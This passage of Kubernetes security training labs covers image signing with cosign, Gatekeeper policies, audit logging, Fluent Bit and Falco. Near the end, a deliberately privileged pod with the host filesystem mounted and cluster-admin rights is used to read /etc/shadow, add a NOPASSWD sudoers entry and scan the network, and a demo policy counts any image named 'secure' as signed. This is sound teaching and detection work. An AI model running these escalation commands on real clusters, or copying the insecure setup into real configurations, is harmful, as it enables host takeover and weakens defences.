-# Generate a key pair for signing
-cosign generate-key-pair
-
-# This will create cosign.key (private) and cosign.pub (public)
-# You'll be prompted to enter a password for the private key
-# For this lab, use password: "lab123"
-
-# Verify the keys were created
-ls -la cosign.*
-
-Subtask 3.3: Sign Container Images
-
-Now let's sign our images:
-
-# Sign the nginx image
-cosign sign --key cosign.key nginx:1.24-alpine
-
-# Sign our vulnerable app image
-cosign sign --key cosign.key vulnerable-app:latest
-
-# Verify the signatures
-cosign verify --key cosign.pub nginx:1.24-alpine
-cosign verify --key cosign.pub vulnerable-app:latest
-
-Subtask 3.4: Create and Sign a Secure Image
-
-Let's create a more secure image and sign it:
-
-# Create a secure Dockerfile
-cat > Dockerfile.secure << 'EOF'
-FROM nginx:1.24-alpine
-RUN addgroup -g 1001 -S appgroup && \
-    adduser -u 1001 -S appuser -G appgroup
-USER appuser
-COPY --chown=appuser:appgroup index.html /usr/share/nginx/html/
-EXPOSE 8080
-EOF
-
-# Create a simple HTML file
-cat > index.html << 'EOF'
-<!DOCTYPE html>
-<html>
-<head><title>Secure App</title></head>
-<body><h1>This is a signed, secure container!</h1></body>
-</html>
-EOF
-
-# Build the secure image
-docker build -f Dockerfile.secure -t secure-app:v1.0 .
-
-# Sign the secure image
-cosign sign --key cosign.key secure-app:v1.0
-
-# Verify the signature
-cosign verify --key cosign.pub secure-app:v1.0
-
-Subtask 3.5: Keyless Signing (Advanced)
-
-Cosign also supports keyless signing using OIDC identity:
-
-# For demonstration, let's see keyless signing syntax
-# (This requires OIDC setup, so we'll show the commands)
-echo "Keyless signing command (for reference):"
-echo "cosign sign secure-app:v1.0"
-echo "cosign verify --certificate-identity=user@example.com --certificate-oidc-issuer=https://github.com/login/oauth secure-app:v1.0"
-
-Task 4: Configure Kubernetes to Enforce Signed Images
-Subtask 4.1: Set Up Kubernetes Cluster
-
-Let's verify our Kubernetes cluster is ready:
-
-# Check cluster status
-kubectl cluster-info
-
-# Create a namespace for our testing
-kubectl create namespace supply-chain-demo
-
-# Set the namespace as default for convenience
-kubectl config set-context --current --namespace=supply-chain-demo
-
-Subtask 4.2: Create ConfigMap with Public Key
-
-We need to make our public key available to the cluster:
-
-# Create a ConfigMap with our public key
-kubectl create configmap cosign-public-key --from-file=cosign.pub
-
-# Verify the ConfigMap
-kubectl get configmap cosign-public-key -o yaml
-
-Subtask 4.3: Install and Configure Gatekeeper
-
-We'll use OPA Gatekeeper as our admission controller:
-
-# Install Gatekeeper
-kubectl apply -f https://raw.githubusercontent.com/open-policy-agent/gatekeeper/release-3.14/deploy/gatekeeper.yaml
-
-# Wait for Gatekeeper to be ready
-kubectl wait --for=condition=Ready pod -l control-plane=controller-manager -n gatekeeper-system --timeout=300s
-
-# Verify Gatekeeper is running
-kubectl get pods -n gatekeeper-system
-
-Subtask 4.4: Create Image Signature Policy
-
-Let's create a policy that requires signed images:
-
-# Create a ConstraintTemplate for image signature verification
-cat > image-signature-template.yaml << 'EOF'
-apiVersion: templates.gatekeeper.sh/v1beta1
-kind: ConstraintTemplate
-metadata:
-  name: requireimagesignature
-spec:
-  crd:
-    spec:
-      names:
-        kind: RequireImageSignature
-      validation:
-        openAPIV3Schema:
-          type: object
-          properties:
-            publicKey:
-              type: string
-            exemptImages:
-              type: array
-              items:
-                type: string
-  targets:
-    - target: admission.k8s.gatekeeper.sh
-      rego: |
-        package requireimagesignature
-        
-        violation[{"msg": msg}] {
-          container := input.review.object.spec.containers[_]
-          image := container.image
-          not is_exempt(image)
-          not is_signed(image)
-          msg := sprintf("Image %v is not signed with required key", [image])
-        }
-        
-        is_exempt(image) {
-          input.parameters.exemptImages[_] == image
-        }
-        
-        is_signed(image) {
-          # This is a simplified check - in practice, you'd integrate with cosign
-          # For this demo, we'll assume images with "secure" in the name are signed
-          contains(image, "secure")
-        }
-EOF
-
-# Apply the ConstraintTemplate
-kubectl apply -f image-signature-template.yaml
-
-# Verify the template was created
-kubectl get constrainttemplates
-
-Subtask 4.5: Create and Apply the Constraint
-
-Now let's create a constraint that uses our template:
-
-# Create a constraint that requires signed images
-cat > require-signed-images.yaml << 'EOF'
-apiVersion: constraints.gatekeeper.sh/v1beta1
-kind: RequireImageSignature
-metadata:
-  name: require-signed-images
-spec:
-  match:
-    kinds:
-      - apiGroups: [""]
-        kinds: ["Pod"]
-      - apiGroups: ["apps"]
-        kinds: ["Deployment"]
-  parameters:
-    publicKey: "cosign-public-key"
-    exemptImages:
-      - "registry.k8s.io/pause:*"
-      - "kindest/kindnetd:*"
-EOF
-
-# Apply the constraint
-kubectl apply -f require-signed-images.yaml
-
-# Verify the constraint
-kubectl get requireimagesignature
-
-Subtask 4.6: Test the Policy Enforcement
-
-Let's test our policy by trying to deploy signed and unsigned images:
-
-# Try to deploy an unsigned image (should be blocked)
-cat > unsigned-deployment.yaml << 'EOF'
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: unsigned-app
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: unsigned-app
-  template:
-    metadata:
-      labels:
-        app: unsigned-app
-    spec:
-      containers:
-      - name: nginx
-        image: nginx:1.24-alpine
-        ports:
-        - containerPort: 80
-EOF
-
-# Try to apply (this should fail due to policy)
-kubectl apply -f unsigned-deployment.yaml
-
-# Deploy a "signed" image (contains "secure" in name)
-cat > signed-deployment.yaml << 'EOF'
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: secure-app
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: secure-app
-  template:
-    metadata:
-      labels:
-        app: secure-app
-    spec:
-      containers:
-      - name: secure-nginx
-        image: secure-app:v1.0
-        ports:
-        - containerPort: 8080
-EOF
-
-# This should succeed
-kubectl apply -f signed-deployment.yaml
-
-# Check the deployment status
-kubectl get deployments
-kubectl get pods
-
-Subtask 4.7: Implement Real Cosign Verification (Advanced)
-
-For a more realistic implementation, let's create a webhook that actually verifies cosign signatures:
-
-# Create a simple verification script
-cat > verify-signature.sh << 'EOF'
-#!/bin/bash
-IMAGE=$1
-PUBLIC_KEY_PATH=$2
-
-# Verify the image signature using cosign
-cosign verify --key "$PUBLIC_KEY_PATH" "$IMAGE" > /dev/null 2>&1
-if [ $? -eq 0 ]; then
-    echo "Image $IMAGE is properly signed"
-    exit 0
-else
-    echo "Image $IMAGE signature verification failed"
-    exit 1
-fi
-EOF
-
-chmod +x verify-signature.sh
-
-# Test the verification script
-./verify-signature.sh secure-app:v1.0 cosign.pub
-./verify-signature.sh nginx:1.24-alpine cosign.pub
-
-Task 5: Complete Supply Chain Security Workflow
-Subtask 5.1: Create a Comprehensive Security Pipeline
-
-Let's put everything together in a complete workflow:
-
-# Create a script that combines all security checks
-cat > security-pipeline.sh << 'EOF'
-#!/bin/bash
-set -e
-
-IMAGE_NAME=$1
-if [ -z "$IMAGE_NAME" ]; then
-    echo "Usage: $0 <image-name>"
-    exit 1
-fi
-
-echo "=== Supply Chain Security Pipeline ==="
-echo "Processing image: $IMAGE_NAME"
-
-# Step 1: Generate SBOM
-echo "Step 1: Generating SBOM..."
-syft "$IMAGE_NAME" -o spdx-json > "${IMAGE_NAME//[:\/]/_}-sbom.json"
-echo "SBOM generated: ${IMAGE_NAME//[:\/]/_}-sbom.json"
-
-# Step 2: Vulnerability Scan
-echo "Step 2: Scanning for vulnerabilities..."
-trivy image --severity HIGH,CRITICAL "$IMAGE_NAME" > "${IMAGE_NAME//[:\/]/_}-vulnerabilities.txt"
-VULN_COUNT=$(trivy image --severity HIGH,CRITICAL --quiet "$IMAGE_NAME" | wc -l)
-echo "Found $VULN_COUNT HIGH/CRITICAL vulnerabilities"
-
-# Step 3: Check if image is signed
-echo "Step 3: Verifying image signature..."
-if cosign verify --key cosign.pub "$IMAGE_NAME" > /dev/null 2>&1; then
-    echo "✓ Image is properly signed"
-    SIGNED=true
-else
-    echo "✗ Image is not signed or signature verification failed"
-    SIGNED=false
-fi
-
-# Step 4: Generate security report
-echo "Step 4: Generating security report..."
-cat > "${IMAGE_NAME//[:\/]/_}-security-report.txt" << EOL
-Supply Chain Security Report
-============================
-Image: $IMAGE_NAME
-Scan Date: $(date)
-
-SBOM: Generated (${IMAGE_NAME//[:\/]/_}-sbom.json)
-Vulnerabilities: $VULN_COUNT HIGH/CRITICAL issues found
-Signature Status: $SIGNED
-
-Recommendation: 
-$(if [ "$VULN_COUNT" -gt 0 ] || [ "$SIGNED" = false ]; then
-    echo "⚠️  This image has security concerns. Review vulnerabilities and ensure proper signing."
-else
-    echo "✅ This image passes basic security checks."
-fi)
-EOL
-
-echo "Security report generated: ${IMAGE_NAME//[:\/]/_}-security-report.txt"
-echo "=== Pipeline Complete ==="
-EOF
-
-chmod +x security-pipeline.sh
-
-Subtask 5.2: Run the Complete Pipeline
-
-Let's test our pipeline with different images:
-
-# Test with our secure signed image
-./security-pipeline.sh secure-app:v1.0
-
-# Test with unsigned nginx image
-./security-pipeline.sh nginx:1.24-alpine
-
-# Test with vulnerable image
-./security-pipeline.sh vulnerable-app:latest
-
-# View the generated reports
-ls -la *-security-report.txt
-cat secure-app_v1.0-security-report.txt
-
-Subtask 5.3: Create Policy as Code
-
-Let's create a policy configuration file:
-
-# Create a supply chain policy configuration
-cat > supply-chain-policy.yaml << 'EOF'
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: supply-chain-policy
-  namespace: supply-chain-demo
-data:
-  policy.yaml: |
-    supply_chain_policy:
-      sbom_required: true
-      vulnerability_scan_required: true
-      max_critical_vulnerabilities: 0
-      max_high_vulnerabilities: 5
-      signature_required: true
-      allowed_registries:
-        - "docker.io"
-        - "gcr.io"
-        - "quay.io"
-      blocked_images:
-        - ".*:latest"  # Block latest tags
-      required_labels:
-        - "maintainer"
-        - "version"
-EOF
-
-kubectl apply -f supply-chain-policy.yaml
-
-Troubleshooting Common Issues
-Issue 1: Cosign Key Generation Fails
-
-# If cosign generate-key-pair fails, try:
-export COSIGN_PASSWORD=lab123
-cosign generate-key-pair --output-key-prefix=lab
-
-Issue 2: Trivy Database Update Issues
-
-# If Trivy scanning fails, update the vulnerability database:
-trivy image --download-db-only
-
-Issue 3: Gatekeeper Policy Not Working
-
-# Check Gatekeeper logs:
-kubectl logs -n gatekeeper-system -l control-plane=controller-manager
-
-# Verify constraint status:
-kubectl describe requireimagesignature require-signed-images
-
-Issue 4: Docker Permission Issues
-
-# If you get permission denied errors:
-sudo usermod -aG docker $USER
-newgrp docker
-
-Conclusion
-
-Congratulations! You have successfully completed the Supply Chain Security lab. Here's what you accomplished:
-Key Achievements
-
-• SBOM Generation: You learned how to create comprehensive Software Bills of Materials for container images, giving you complete visibility into all components and dependencies in your containers.
-
-• Vulnerability Assessment: You mastered using Trivy to scan container images for security vulnerabilities, understanding how to identify and prioritize security risks in your supply chain.
-
-• Image Signing and Verification: You implemented cryptographic signing of container images using Cosign, ensuring image authenticity and integrity throughout the deployment pipeline.
-
-• Policy Enforcement: You configured Kubernetes admission controllers to automatically enforce supply chain security policies, preventing unsigned or vulnerable images from being deployed.
-
-• Complete Security Pipeline: You created an integrated workflow that combines SBOM generation, vulnerability scanning, and signature verification into a comprehensive security pipeline.
-Why This Matters
-
-Supply chain security is critical in modern containerized environments because:
-
-• Trust and Integrity: Signed images ensure you're running exactly what the publisher intended, preventing supply chain attacks • Vulnerability Management: Regular scanning helps identify and remediate security issues before they reach production • Compliance: Many regulatory frameworks now require SBOM generation and vulnerability tracking • Risk Reduction: Comprehensive supply chain security reduces the attack surface and potential for compromise
-Real-World Applications
-
-The skills you've learned apply directly to:
-
-• DevSecOps Pipelines: Integrating security checks into CI/CD workflows • Kubernetes Security: Implementing admission controllers and security policies • Compliance Reporting: Generating SBOMs and vulnerability reports for audits • Container Registry Management: Ensuring only secure, signed images are stored and deployed
-Next Steps
-
-To further enhance your supply chain security knowledge:
-
-• Explore advanced Cosign features like keyless signing with OIDC • Implement automated vulnerability remediation workflows • Study supply chain attack vectors and mitigation strategies • Practice with enterprise container registries and their security features
-
-You now have the foundational skills to implement robust supply chain security practices in production Kubernetes environments, making you well-prepared for the Certified Kubernetes Security Specialist (CKS) certification and real-world security challenges.
-
-
-
-
-
-Lab 7: Monitoring and Runtime Security
-Objectives
-
-By the end of this lab, students will be able to:
-
-• Configure and enable Kubernetes audit logging to track cluster activities • Deploy and configure logging agents to collect runtime logs from Kubernetes clusters • Install and configure Falco for runtime security monitoring and threat detection • Simulate realistic attack scenarios including privilege escalation attempts • Analyze audit logs to identify attack patterns and trace security incidents • Implement detection rules for common Kubernetes security threats • Understand the correlation between audit logs and runtime security events • Develop incident response procedures based on security monitoring data
-Prerequisites
-
-Before starting this lab, students should have:
-
-• Basic understanding of Kubernetes concepts (pods, services, deployments) • Familiarity with Linux command line operations • Knowledge of YAML configuration files • Understanding of container security fundamentals • Basic knowledge of log analysis and monitoring concepts • Completion of previous CKS labs or equivalent Kubernetes security experience
-Lab Environment Setup
-
-Ready-to-Use Cloud Machines: Al Nafi provides pre-configured Linux-based cloud machines for this lab. Simply click Start Lab to access your environment. No need to build your own VM or install additional software - everything is ready to use!
-
-Your lab environment includes: • Ubuntu 20.04 LTS with Kubernetes cluster pre-installed • kubectl configured and ready to use • All necessary tools and dependencies pre-installed • Internet access for downloading additional components
-Task 1: Enable Kubernetes Audit Logs and Configure Logging Agents
-Subtask 1.1: Configure Kubernetes Audit Logging
-
-First, we'll enable comprehensive audit logging for the Kubernetes API server to track all cluster activities.
-
-Step 1: Create the audit policy configuration file
-
-sudo mkdir -p /etc/kubernetes/audit
-
-sudo tee /etc/kubernetes/audit/audit-policy.yaml > /dev/null <<EOF
-apiVersion: audit.k8s.io/v1
-kind: Policy
-rules:
-# Log all requests at the Metadata level for security-sensitive resources
-- level: Metadata
-  resources:
-  - group: ""
-    resources: ["secrets", "configmaps"]
-  - group: "rbac.authorization.k8s.io"
-    resources: ["roles", "rolebindings", "clusterroles", "clusterrolebindings"]
-
-# Log all authentication and authorization events
-- level: Request
-  users: ["system:anonymous"]
-  verbs: ["*"]
-
-# Log privilege escalation attempts
-- level: RequestResponse
-  resources:
-  - group: ""
-    resources: ["pods/exec", "pods/portforward", "pods/proxy"]
-
-# Log all requests to security-sensitive namespaces
-- level: Request
-  namespaces: ["kube-system", "kube-public", "default"]
-
-# Log all failed requests
-- level: Request
-  omitStages:
-  - RequestReceived
-  resources:
-  - group: ""
-    resources: ["*"]
-  namespaceSelector:
-    matchLabels:
-      audit: "true"
-
-# Catch-all rule for other requests
-- level: Metadata
-  omitStages:
-  - RequestReceived
-EOF
-
-Step 2: Modify the API server configuration to enable audit logging
-
-sudo cp /etc/kubernetes/manifests/kube-apiserver.yaml /etc/kubernetes/manifests/kube-apiserver.yaml.backup
-
-sudo tee /tmp/apiserver-patch.yaml > /dev/null <<EOF
-spec:
-  containers:
-  - name: kube-apiserver
-    command:
-    - kube-apiserver
-    - --audit-log-path=/var/log/kubernetes/audit.log
-    - --audit-policy-file=/etc/kubernetes/audit/audit-policy.yaml
-    - --audit-log-maxage=30
-    - --audit-log-maxbackup=10
-    - --audit-log-maxsize=100
-    volumeMounts:
-    - name: audit-policy
-      mountPath: /etc/kubernetes/audit
-      readOnly: true
-    - name: audit-logs
-      mountPath: /var/log/kubernetes
-  volumes:
-  - name: audit-policy
-    hostPath:
-      path: /etc/kubernetes/audit
-      type: DirectoryOrCreate
-  - name: audit-logs
-    hostPath:
-      path: /var/log/kubernetes
-      type: DirectoryOrCreate
-EOF
-
-Step 3: Apply the audit configuration by updating the API server manifest
-
-# Create the log directory
-sudo mkdir -p /var/log/kubernetes
-
-# Update the kube-apiserver manifest
-sudo python3 -c "
-import yaml
-import sys
-
-# Read the original manifest
-with open('/etc/kubernetes/manifests/kube-apiserver.yaml', 'r') as f:
-    manifest = yaml.safe_load(f)
-
-# Add audit parameters to command
-container = manifest['spec']['containers'][0]
-audit_flags = [
-    '--audit-log-path=/var/log/kubernetes/audit.log',
-    '--audit-policy-file=/etc/kubernetes/audit/audit-policy.yaml',
-    '--audit-log-maxage=30',
-    '--audit-log-maxbackup=10',
-    '--audit-log-maxsize=100'
-]
-
-for flag in audit_flags:
-    if flag not in container['command']:
-        container['command'].append(flag)
-
-# Add volume mounts
-if 'volumeMounts' not in container:
-    container['volumeMounts'] = []
-
-volume_mounts = [
-    {'name': 'audit-policy', 'mountPath': '/etc/kubernetes/audit', 'readOnly': True},
-    {'name': 'audit-logs', 'mountPath': '/var/log/kubernetes'}
-]
-
-for vm in volume_mounts:
-    if not any(existing['name'] == vm['name'] for existing in container['volumeMounts']):
-        container['volumeMounts'].append(vm)
-
-# Add volumes
-if 'volumes' not in manifest['spec']:
-    manifest['spec']['volumes'] = []
-
-volumes = [
-    {'name': 'audit-policy', 'hostPath': {'path': '/etc/kubernetes/audit', 'type': 'DirectoryOrCreate'}},
-    {'name': 'audit-logs', 'hostPath': {'path': '/var/log/kubernetes', 'type': 'DirectoryOrCreate'}}
-]
-
-for vol in volumes:
-    if not any(existing['name'] == vol['name'] for existing in manifest['spec']['volumes']):
-        manifest['spec']['volumes'].append(vol)
-
-# Write the updated manifest
-with open('/etc/kubernetes/manifests/kube-apiserver.yaml', 'w') as f:
-    yaml.dump(manifest, f, default_flow_style=False)
-"
-
-Step 4: Wait for the API server to restart and verify audit logging
-
-# Wait for API server to restart (this may take 1-2 minutes)
-echo "Waiting for API server to restart with audit logging enabled..."
-sleep 60
-
-# Check if audit log file is being created
-sudo ls -la /var/log/kubernetes/
-
-# Verify API server is running
-kubectl get nodes
-
-# Generate some activity to create audit logs
-kubectl get pods --all-namespaces
-kubectl get secrets --all-namespaces
-
-Subtask 1.2: Deploy Fluent Bit for Log Collection
-
-Now we'll deploy Fluent Bit as a DaemonSet to collect logs from all nodes in the cluster.
-
-Step 1: Create namespace for logging
-
-kubectl create namespace logging
-
-Step 2: Create Fluent Bit configuration
-
-kubectl apply -f - <<EOF
-apiVersion: v1
-kind: ConfigMap
-metadata:
-  name: fluent-bit-config
-  namespace: logging
-data:
-  fluent-bit.conf: |
-    [SERVICE]
-        Flush         1
-        Log_Level     info
-        Daemon        off
-        Parsers_File  parsers.conf
-        HTTP_Server   On
-        HTTP_Listen   0.0.0.0
-        HTTP_Port     2020
-
-    [INPUT]
-        Name              tail
-        Path              /var/log/containers/*.log
-        Parser            docker
-        Tag               kube.*
-        Refresh_Interval  5
-        Mem_Buf_Limit     50MB
-        Skip_Long_Lines   On
-
-    [INPUT]
-        Name              tail
-        Path              /var/log/kubernetes/audit.log
-        Parser            json
-        Tag               audit.*
-        Refresh_Interval  5
-        Mem_Buf_Limit     50MB
-
-    [FILTER]
-        Name                kubernetes
-        Match               kube.*
-        Kube_URL            https://kubernetes.default.svc:443
-        Kube_CA_File        /var/run/secrets/kubernetes.io/serviceaccount/ca.crt
-        Kube_Token_File     /var/run/secrets/kubernetes.io/serviceaccount/token
-        Kube_Tag_Prefix     kube.var.log.containers.
-        Merge_Log           On
-        Keep_Log            Off
-        K8S-Logging.Parser  On
-        K8S-Logging.Exclude On
-
-    [OUTPUT]
-        Name  stdout
-        Match *
-
-  parsers.conf: |
-    [PARSER]
-        Name   docker
-        Format json
-        Time_Key time
-        Time_Format %Y-%m-%dT%H:%M:%S.%L
-        Time_Keep   On
-
-    [PARSER]
-        Name        json
-        Format      json
-        Time_Key    timestamp
-        Time_Format %Y-%m-%dT%H:%M:%S.%L
-        Time_Keep   On
-EOF
-
-Step 3: Deploy Fluent Bit DaemonSet
-
-kubectl apply -f - <<EOF
-apiVersion: apps/v1
-kind: DaemonSet
-metadata:
-  name: fluent-bit
-  namespace: logging
-  labels:
-    k8s-app: fluent-bit-logging
-    version: v1
-    kubernetes.io/cluster-service: "true"
-spec:
-  selector:
-    matchLabels:
-      k8s-app: fluent-bit-logging
-  template:
-    metadata:
-      labels:
-        k8s-app: fluent-bit-logging
-        version: v1
-        kubernetes.io/cluster-service: "true"
-    spec:
-      containers:
-      - name: fluent-bit
-        image: fluent/fluent-bit:2.2.0
-        imagePullPolicy: Always
-        ports:
-          - containerPort: 2020
-        volumeMounts:
-        - name: varlog
-          mountPath: /var/log
-        - name: varlibdockercontainers
-          mountPath: /var/lib/docker/containers
-          readOnly: true
-        - name: fluent-bit-config
-          mountPath: /fluent-bit/etc/
-        - name: mnt
-          mountPath: /mnt
-          readOnly: true
-      terminationGracePeriodSeconds: 10
-      volumes:
-      - name: varlog
-        hostPath:
-          path: /var/log
-      - name: varlibdockercontainers
-        hostPath:
-          path: /var/lib/docker/containers
-      - name: fluent-bit-config
-        configMap:
-          name: fluent-bit-config
-      - name: mnt
-        hostPath:
-          path: /mnt
-      serviceAccountName: fluent-bit
-      tolerations:
-      - key: node-role.kubernetes.io/master
-        operator: Exists
-        effect: NoSchedule
-      - operator: "Exists"
-        effect: "NoExecute"
-      - operator: "Exists"
-        effect: "NoSchedule"
----
-apiVersion: v1
-kind: ServiceAccount
-metadata:
-  name: fluent-bit
-  namespace: logging
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRole
-metadata:
-  name: fluent-bit-read
-rules:
-- apiGroups: [""]
-  resources:
-  - namespaces
-  - pods
-  verbs: ["get", "list", "watch"]
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRoleBinding
-metadata:
-  name: fluent-bit-read
-roleRef:
-  apiGroup: rbac.authorization.k8s.io
-  kind: ClusterRole
-  name: fluent-bit-read
-subjects:
-- kind: ServiceAccount
-  name: fluent-bit
-  namespace: logging
-EOF
-
-Step 4: Verify Fluent Bit deployment
-
-# Check if Fluent Bit pods are running
-kubectl get pods -n logging
-
-# Check Fluent Bit logs to ensure it's collecting data
-kubectl logs -n logging -l k8s-app=fluent-bit-logging --tail=50
-
-Task 2: Deploy Falco for Runtime Security Monitoring
-Subtask 2.1: Install and Configure Falco
-
-Falco is a runtime security monitoring tool that detects anomalous activity in applications and containers.
-
-Step 1: Add Falco Helm repository and install Falco
-
-# Install Helm if not already installed
-curl https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-3 | bash
-
-# Add Falco Helm repository
-helm repo add falcosecurity https://falcosecurity.github.io/charts
-helm repo update
-
-Step 2: Create custom Falco configuration
-
-kubectl create namespace falco-system
-
-# Create custom Falco values file
-cat > falco-values.yaml <<EOF
-falco:
-  grpc:
-    enabled: true
-  grpcOutput:
-    enabled: true
-  jsonOutput: true
-  jsonIncludeOutputProperty: true
-  logLevel: info
-  
-  rules_file:
-    - /etc/falco/falco_rules.yaml
-    - /etc/falco/falco_rules.local.yaml
-    - /etc/falco/k8s_audit_rules.yaml
-    - /etc/falco/rules.d
-
-  plugins:
-    - name: k8saudit
-      library_path: libk8saudit.so
-      init_config:
-        maxEventBytes: 1048576
-        webhookMaxBatchSize: 12582912
-      open_params: "http://localhost:9765/k8s-audit"
-    - name: json
-      library_path: libjson.so
-
-  load_plugins: [k8saudit, json]
-
-driver:
-  enabled: true
-  kind: ebpf
-
-serviceMonitor:
-  enabled: false
-
-falcoctl:
-  artifact:
-    install:
-      enabled: true
-    follow:
-      enabled: true
-
-customRules:
-  custom-rules.yaml: |-
-    # Custom rules for lab scenarios
-    - rule: Detect Privilege Escalation Attempt
-      desc: Detect attempts to escalate privileges
-      condition: >
-        spawned_process and
-        (proc.name in (sudo, su, doas) or
-         proc.args contains "chmod +s" or
-         proc.args contains "setuid" or
-         proc.args contains "setgid")
-      output: >
-        Privilege escalation attempt detected
-        (user=%user.name command=%proc.cmdline container=%container.name image=%container.image.repository)
-      priority: WARNING
-      tags: [privilege_escalation, security]
-
-    - rule: Detect Suspicious Network Activity
-      desc: Detect suspicious network connections
-      condition: >
-        inbound_outbound and
-        fd.typechar=4 and fd.ip != "0.0.0.0" and
-        not proc.name in (kubelet, kube-proxy, coredns, etcd, kube-apiserver, kube-controller-manager, kube-scheduler)
-      output: >
-        Suspicious network activity detected
-        (user=%user.name command=%proc.cmdline connection=%fd.name container=%container.name image=%container.image.repository)
-      priority: NOTICE
-      tags: [network, security]
-
-    - rule: Detect File System Modifications in Sensitive Directories
-      desc: Detect modifications to sensitive system directories
-      condition: >
-        open_write and
-        (fd.name startswith /etc/ or
-         fd.name startswith /usr/bin/ or
-         fd.name startswith /usr/sbin/ or
-         fd.name startswith /bin/ or
-         fd.name startswith /sbin/) and
-        not proc.name in (dpkg, apt, yum, rpm, package-manager)
-      output: >
-        Sensitive file system modification detected
-        (user=%user.name file=%fd.name command=%proc.cmdline container=%container.name image=%container.image.repository)
-      priority: WARNING
-      tags: [filesystem, security]
-EOF
-
-Step 3: Install Falco using Helm
-
-helm install falco falcosecurity/falco \
-  --namespace falco-system \
-  --values falco-values.yaml \
-  --wait
-
-Step 4: Verify Falco installation
-
-# Check if Falco pods are running
-kubectl get pods -n falco-system
-
-# Check Falco logs
-kubectl logs -n falco-system -l app.kubernetes.io/name=falco --tail=50
-
-# Verify Falco is detecting events
-kubectl logs -n falco-system -l app.kubernetes.io/name=falco | grep -i "rule\|priority"
-
-Subtask 2.2: Configure Audit Log Integration with Falco
-
-Step 1: Create a webhook server to forward audit logs to Falco
-
-kubectl apply -f - <<EOF
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: audit-webhook
-  namespace: falco-system
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: audit-webhook
-  template:
-    metadata:
-      labels:
-        app: audit-webhook
-    spec:
-      containers:
-      - name: audit-webhook
-        image: nginx:alpine
-        ports:
-        - containerPort: 9765
-        command: ["/bin/sh"]
-        args:
-        - -c
-        - |
-          cat > /etc/nginx/nginx.conf <<EOF
-          events {}
-          http {
-            server {
-              listen 9765;
-              location /k8s-audit {
-                proxy_pass http://falco.falco-system.svc.cluster.local:8765/k8s-audit;
-                proxy_set_header Host \$host;
-                proxy_set_header X-Real-IP \$remote_addr;
-              }
-            }
-          }
-          EOF
-          nginx -g 'daemon off;'
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: audit-webhook
-  namespace: falco-system
-spec:
-  selector:
-    app: audit-webhook
-  ports:
-  - port: 9765
-    targetPort: 9765
-  type: ClusterIP
-EOF
-
-Step 2: Configure API server to send audit logs to webhook (optional advanced configuration)
-
-# This step demonstrates webhook configuration but requires API server restart
-echo "Note: Webhook audit configuration requires additional API server configuration"
-echo "For this lab, we'll focus on file-based audit logs that Fluent Bit collects"
-
-Task 3: Simulate Attack Scenarios and Detect Anomalies
-Subtask 3.1: Create Vulnerable Test Environment
-
-Step 1: Deploy a vulnerable application for testing
-
-kubectl apply -f - <<EOF
-apiVersion: v1
-kind: Namespace
-metadata:
-  name: vulnerable-app
-  labels:
-    audit: "true"
----
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: vulnerable-web-app
-  namespace: vulnerable-app
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: vulnerable-web-app
-  template:
-    metadata:
-      labels:
-        app: vulnerable-web-app
-    spec:
-      containers:
-      - name: web-app
-        image: nginx:alpine
-        ports:
-        - containerPort: 80
-        securityContext:
-          runAsUser: 0
-          privileged: true
-          allowPrivilegeEscalation: true
-        volumeMounts:
-        - name: host-root
-          mountPath: /host
-        command: ["/bin/sh"]
-        args:
-        - -c
-        - |
-          # Install additional tools for demonstration
-          apk add --no-cache curl wget netcat-openbsd
-          # Start nginx
-          nginx -g 'daemon off;' &
-          # Keep container running
-          tail -f /dev/null
-      volumes:
-      - name: host-root
-        hostPath:
-          path: /
-      serviceAccountName: vulnerable-sa
----
-apiVersion: v1
-kind: ServiceAccount
-metadata:
-  name: vulnerable-sa
-  namespace: vulnerable-app
----
-apiVersion: rbac.authorization.k8s.io/v1
-kind: ClusterRoleBinding
-metadata:
-  name: vulnerable-binding
-roleRef:
-  apiGroup: rbac.authorization.k8s.io
-  kind: ClusterRole
-  name: cluster-admin
-subjects:
-- kind: ServiceAccount
-  name: vulnerable-sa
-  namespace: vulnerable-app
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: vulnerable-web-service
-  namespace: vulnerable-app
-spec:
-  selector:
-    app: vulnerable-web-app
-  ports:
-  - port: 80
-    targetPort: 80
-  type: ClusterIP
-EOF
-
-Step 2: Wait for the vulnerable application to be ready
-
-# Wait for deployment to be ready
-kubectl wait --for=condition=available --timeout=300s deployment/vulnerable-web-app -n vulnerable-app
-
-# Get pod name for later use
-VULNERABLE_POD=$(kubectl get pods -n vulnerable-app -l app=vulnerable-web-app -o jsonpath='{.items[0].metadata.name}')
-echo "Vulnerable pod name: $VULNERABLE_POD"
-
-Subtask 3.2: Simulate Privilege Escalation Attack
-
-Step 1: Monitor Falco logs in real-time (open a new terminal for this)
-
-# In a new terminal window, monitor Falco alerts
-kubectl logs -n falco-system -l app.kubernetes.io/name=falco -f | grep -E "(WARNING|ERROR|CRITICAL)"
-
-Step 2: Execute privilege escalation attempts
-
-# Attempt 1: Try to access sensitive files
-echo "=== Attempting to access /etc/shadow ==="
-kubectl exec -n vulnerable-app $VULNERABLE_POD -- cat /host/etc/shadow
-
-# Attempt 2: Try to modify system files
-echo "=== Attempting to modify system files ==="
-kubectl exec -n vulnerable-app $VULNERABLE_POD -- touch /host/etc/malicious-file
-
-# Attempt 3: Try to escalate privileges using sudo
-echo "=== Attempting privilege escalation ==="
-kubectl exec -n vulnerable-app $VULNERABLE_POD -- sh -c "echo 'malicious-user ALL=(ALL) NOPASSWD:ALL' >> /host/etc/sudoers"
-
-# Attempt 4: Try to access other containers' processes
-echo "=== Attempting to access host processes ==="
-kubectl exec -n vulnerable-app $VULNERABLE_POD -- ps aux
-
-# Attempt 5: Network reconnaissance
-echo "=== Attempting network reconnaissance ==="
-kubectl exec -n vulnerable-app $VULNERABLE_POD -- nmap -sn 10.0.0.0/8 2>/dev/null || echo "nmap not available, using nc"
